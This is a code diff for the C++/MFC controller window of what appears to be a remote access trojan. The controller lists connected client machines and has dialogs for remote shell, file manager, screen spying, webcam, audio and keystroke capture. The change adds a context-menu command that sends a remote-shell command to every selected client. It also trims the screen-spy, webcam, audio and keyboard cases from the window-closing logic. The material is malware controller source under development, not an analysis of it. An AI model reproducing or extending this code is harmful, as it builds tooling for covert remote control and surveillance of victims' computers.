@@ -57,9 +57,14 @@ BEGIN_MESSAGE_MAP(CChildView, CWnd)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
+	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_WM_CREATE()
 	ON_WM_SIZE()
 	ON_WM_CONTEXTMENU()
+	
+
+	
+	ON_COMMAND(ID_LISTCTRLMENU_SHELL, &CChildView::OnListctrlmenuShell)
 END_MESSAGE_MAP()
 
 
@@ -245,17 +250,19 @@ void CChildView::OnContextMenu(CWnd* pWnd, CPoint point)
 	menu.LoadMenu (IDR_LIST);
 	pPopup = menu.GetSubMenu(0);
 	ASSERT(pPopup != NULL);	
-	if (m_ListCtrl.GetSelectedCount() <= 0)
+	int listFlag;
+	listFlag = m_ListCtrl.GetSelectedCount();
+	if (listFlag <= 0)
 	{
-	
 		pPopup->EnableMenuItem(ID_LISTCTRLMENU_SHELL,MF_GRAYED);
 		pPopup->EnableMenuItem(ID_LISTCTRLMENU_FILEMANAGER,MF_GRAYED);
 		pPopup->EnableMenuItem(ID_LISTCTRLMENU_DISCONNECT,MF_GRAYED);
 	}
-	else{
-	pPopup->EnableMenuItem(ID_LISTCTRLMENU_SHELL,MF_ENABLED);
-	pPopup->EnableMenuItem(ID_LISTCTRLMENU_FILEMANAGER,MF_ENABLED);
-	pPopup->EnableMenuItem(ID_LISTCTRLMENU_DISCONNECT,MF_ENABLED);
+	else
+	{
+		pPopup->EnableMenuItem(ID_LISTCTRLMENU_SHELL,MF_ENABLED);
+		pPopup->EnableMenuItem(ID_LISTCTRLMENU_FILEMANAGER,MF_ENABLED);
+		pPopup->EnableMenuItem(ID_LISTCTRLMENU_DISCONNECT,MF_ENABLED);
 	}
 	pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_LEFTBUTTON, 
 		point.x, point.y, pCWnd);	
@@ -264,7 +271,7 @@ void CChildView::OnContextMenu(CWnd* pWnd, CPoint point)
 LRESULT CChildView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext	*pContext = (ClientContext *)lParam;
-	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
+	CShellDlg *dlg = new CShellDlg(this, m_iocpServer, pContext);
 
 	// 设置父窗口为卓面
 	dlg->Create(IDD_SHELL, GetDesktopWindow());
@@ -291,16 +298,10 @@ LRESULT CChildView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 				break;
 			}		
 		}
-
 		// 关闭相关窗口
-
 		switch (pContext->m_Dialog[0])
 		{
 		case FILEMANAGER_DLG:
-		case SCREENSPY_DLG:
-		case WEBCAM_DLG:
-		case AUDIO_DLG:
-		case KEYBOARD_DLG:
 		case SYSTEM_DLG:
 		case SHELL_DLG:
 			//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
@@ -312,4 +313,26 @@ LRESULT CChildView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 	}catch(...){}
 
 	return 0;
+}
+void CChildView::SendSelectCommand(PBYTE pData, UINT nSize)
+{
+	// TODO: Add your command handler code here
+
+	POSITION pos = m_ListCtrl.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
+	while(pos) //so long as we have a valid POSITION, we keep iterating
+	{
+		int	nItem = m_ListCtrl.GetNextSelectedItem(pos);
+		ClientContext* pContext = (ClientContext*)m_ListCtrl.GetItemData(nItem);
+		// 发送获得驱动器列表数据包
+		m_iocpServer->Send(pContext, pData, nSize);
+
+		//Save the pointer to the new item in our CList
+	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
+}
+
+void CChildView::OnListctrlmenuShell()
+{
+	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_SHELL;
+	SendSelectCommand(&bToken, sizeof(BYTE));	
 }
